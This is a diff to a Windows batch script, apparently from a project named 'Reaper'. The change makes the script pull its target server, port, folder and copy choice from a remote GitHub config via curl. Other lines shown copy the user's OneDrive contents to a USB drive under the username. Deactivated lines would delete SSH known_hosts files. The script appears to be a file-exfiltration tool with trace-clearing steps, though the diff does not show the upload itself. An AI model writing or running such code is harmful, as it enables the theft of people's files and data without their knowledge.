@@ -1,8 +1,6 @@
 @echo off
 setlocal enabledelayedexpansion
 
-@echo off
-
 :: Set the URL of the configuration file on GitHub
 set "configUrl=https://raw.githubusercontent.com/AROA-DEV/Reaper/Testing/Config/Reaper-config.cfg"
 
@@ -55,20 +53,20 @@ if exist "Reaper-config.cfg" (
 
 :Active
 :: Read the remote configuration file
-for /f "usebackq tokens=1* delims== " %%a in ("remote_config.cfg") do (
-    if /i "%%a"=="TARGET_SERVER" (
-        :: Get the target server from the remote configuration
-        set "target_server=%%b"
-    ) else if /i "%%a"=="TARGET_PORT" (
-        :: Get the target server port from the remote configuration
-        set "target_port=%%b"
-    ) else if /i "%%a"=="TARGET_FOLDER" (
-        :: Get the target folder path from the remote configuration
-        set "target_folder=%%b"
-    ) else if /i "%%a"=="COPY_FILES" (
-        :: Get the choice to copy files from the remote configuration
-        set "CopyFiles=%%b"
-    )
+for /f "usebackq tokens=1* delims== " %%a in (`curl -L "%configUrl%"`) do (
+ if /i "%%a"=="TARGET_SERVER" (
+ :: Get the target server from the remote configuration
+ set "target_server=%%b"
+ ) else if /i "%%a"=="TARGET_PORT" (
+ :: Get the target server port from the remote configuration
+ set "target_port=%%b"
+ ) else if /i "%%a"=="TARGET_FOLDER" (
+ :: Get the target folder path from the remote configuration
+ set "target_folder=%%b"
+ ) else if /i "%%a"=="COPY_FILES" (
+ :: Get the choice to copy files from the remote configuration
+ set "CopyFiles=%%b"
+ )
 )
 
 :: Validate if all the required variables are set
@@ -152,7 +150,7 @@ if /i "%CopyFiles%"=="n" (
 :: #deactivated del "%USERPROFILE%\.ssh\known_hosts"
 :: #deactivated del "%USERPROFILE%\.ssh\known_hosts.old"
 
-set dest_folder="%usb_drive%:\%USERNAME%"
+set dest_folder="%usb_drive%\%USERNAME%"
 
 md "%dest_folder%"
 xcopy /E /Y "%onedrive%" "%dest_folder%\OneDrive\"
